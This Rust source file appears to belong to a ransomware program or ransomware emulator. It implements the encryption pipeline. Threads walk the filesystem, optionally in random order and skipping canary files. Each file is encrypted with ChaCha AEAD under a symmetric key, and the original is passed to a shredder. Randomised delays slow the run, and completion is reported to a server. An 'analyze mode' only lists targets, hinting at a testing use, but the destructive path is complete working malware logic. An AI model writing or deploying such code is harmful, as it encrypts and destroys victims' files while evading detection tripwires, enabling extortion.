use flume::{Receiver, Sender};
use log::{debug, error, info};
use rand::RngExt;
use std::{
    fs::OpenOptions,
    io::{BufWriter, Write},
    panic,
    path::PathBuf,
    sync::Arc,
    thread, time,
};
use zeroize::Zeroizing;

use crate::{
    canary::{canary_active, filter_canary},
    client::{ThreadCounts, channel_capacity, recv_path},
    comm::{ServerConn, announce_completion},
    config,
    crypto::{aead_encrypt_file, encrypted_file_path, generate_nonce},
    shredder::shred,
    status::{ANALYSIS_FILENAME, Status, export_status_csv},
    walker::{random_walk_with_exts, walk_with_exts},
};

pub struct EncryptionPipeline<'a> {
    pub status: &'a mut Status,
    pub sym_key: &'a Arc<Zeroizing<[u8; 32]>>,
    pub exe_path_dir: &'a Arc<PathBuf>,
    pub thread_counts: &'a ThreadCounts,
    pub conn: &'a ServerConn,
    pub preshared_secret: &'a str,
    pub aad: &'a Arc<[u8]>,
}

fn spawn_encrypt_stage(
    handles: &mut Vec<thread::JoinHandle<()>>,
    input: &Receiver<Arc<PathBuf>>,
    output: &Sender<Arc<PathBuf>>,
    count: usize,
    sym_key: &Arc<Zeroizing<[u8; 32]>>,
    aad: &Arc<[u8]>,
) {
    for _ in 0..count {
        handles.push(encrypt(
            input.clone(),
            output.clone(),
            Arc::clone(sym_key),
            Arc::clone(aad),
        ));
    }
}

fn spawn_shred_stage(
    handles: &mut Vec<thread::JoinHandle<()>>,
    input: &Receiver<Arc<PathBuf>>,
    count: usize,
) {
    for _ in 0..count {
        handles.push(shred(input.clone()));
    }
}

#[allow(clippy::needless_pass_by_value)]
pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> Result<(), String> {
    debug!("Starting encryption process");

    cfg.status.encryption_started = true;
    export_status_csv(cfg.exe_path_dir.as_ref(), cfg.status)
        .map_err(|error| format!("Failed to update status CSV: {error}"))?;

    let (walk_tx, walk_rx) = flume::bounded(channel_capacity(cfg.thread_counts.encrypt));
    let mut thread_handles = Vec::new();

    if config::RANDOM_ORDER {
        thread_handles.push(random_walk_with_exts(
            walk_tx.clone(),
            None,
            None,
            cfg.thread_counts.walk,
        ));
    } else {
        thread_handles.push(walk_with_exts(
            walk_tx.clone(),
            None,
            None,
            cfg.thread_counts.walk,
        ));
    }
    drop(walk_tx);

    let work_receiver = if canary_active() {
        let (filter_tx, filter_rx) = flume::bounded(channel_capacity(cfg.thread_counts.encrypt));
        for _ in 0..cfg.thread_counts.canary {
            thread_handles.push(filter_canary(walk_rx.clone(), filter_tx.clone()));
        }
        drop(walk_rx);
        drop(filter_tx);
        filter_rx
    } else {
        walk_rx
    };

    if config::ANALYZE_MODE {
        thread_handles.push(record(work_receiver, Arc::clone(cfg.exe_path_dir)));
    } else {
        let (crypt_tx, crypt_rx) = flume::bounded(channel_capacity(cfg.thread_counts.shred));
        spawn_encrypt_stage(
            &mut thread_handles,
            &work_receiver,
            &crypt_tx,
            cfg.thread_counts.encrypt,
            cfg.sym_key,
            cfg.aad,
        );
        drop(work_receiver);
        drop(crypt_tx);
        spawn_shred_stage(&mut thread_handles, &crypt_rx, cfg.thread_counts.shred);
        drop(crypt_rx);
    }

    for handle in thread_handles {
        handle.join().expect("Thread panicked");
    }

    cfg.status.encryption_complete = true;
    if let Err(error) = export_status_csv(cfg.exe_path_dir.as_ref(), cfg.status) {
        error!("Failed to update status CSV: {error}");
    }

    if let Err(error) = announce_completion(cfg.conn, cfg.status, cfg.preshared_secret) {
        error!("Failed to announce completion: {error}");
    }
    Ok(())
}

fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let analysis_file_path = path.join(ANALYSIS_FILENAME.as_str());
        let file = match OpenOptions::new()
            .append(true)
            .create(true)
            .open(&analysis_file_path)
        {
            Ok(file) => file,
            Err(error) => {
                error!("Failed to open analysis file for recording: {error}");
                return;
            }
        };
        let mut analysis_file = BufWriter::new(file);

        loop {
            let Some(file_path) = recv_path(&receiver) else {
                if let Err(error) = analysis_file.flush() {
                    error!("Failed to flush analysis file: {error}");
                }
                return;
            };

            if let Err(error) = writeln!(analysis_file, "{}", file_path.to_string_lossy()) {
                error!("Failed to write to analysis file: {error}");
            }
        }
    })
}

fn apply_throttle() {
    let wait_time = u64::from(config::WAIT_TIME);
    if wait_time == 0 {
        return;
    }
    let jitter = u64::from(config::JITTER_TIME).min(wait_time);
    let secs = if jitter > 0 {
        (wait_time - jitter) + rand::rng().random_range(0..=jitter.saturating_mul(2))
    } else {
        wait_time
    };
    debug!("Sleeping {secs} seconds before next encryption");
    thread::sleep(time::Duration::from_secs(secs));
}

pub fn encrypt(
    receiver: Receiver<Arc<PathBuf>>,
    sender: Sender<Arc<PathBuf>>,
    key: Arc<Zeroizing<[u8; 32]>>,
    aad: Arc<[u8]>,
) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || {
        loop {
            let Some(file_path) = recv_path(&receiver) else {
                return;
            };

            let result = panic::catch_unwind({
                let file_path = file_path.clone();
                let key = Arc::clone(&key);
                let aad = Arc::clone(&aad);
                let sender = sender.clone();
                move || {
                    info!("Encrypting file: {file_path:?}");

                    let full_nonce_bytes = generate_nonce();
                    let encrypted_file_path = encrypted_file_path(
                        file_path.as_ref(),
                        &full_nonce_bytes,
                        config::ENCRYPTED_EXTENSION.as_str(),
                    );

                    debug!(
                        "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
                        file_path.as_ref().display(),
                        encrypted_file_path.display(),
                        full_nonce_bytes
                    );
                    match aead_encrypt_file(
                        file_path.as_ref(),
                        &encrypted_file_path,
                        &key,
                        &full_nonce_bytes,
                        &aad,
                        config::MAX_ENCRYPT_FILE_BYTES,
                    ) {
                        Ok(()) => {
                            debug!(
                                "Successfully applied ChaCha to data for encryption: {file_path:?}"
                            );
                            if let Err(error) = sender.send(file_path.clone()) {
                                error!("Failed to send path to shredder thread: {error}");
                            }
                        }
                        Err(error) => {
                            error!("Failed to apply ChaCha to data for encryption: {error:?}");
                        }
                    }

                    apply_throttle();
                }
            });

            if result.is_err() {
                error!("Encryption thread recovered from panic on file: {file_path:?}");
            }
        }
    })
}
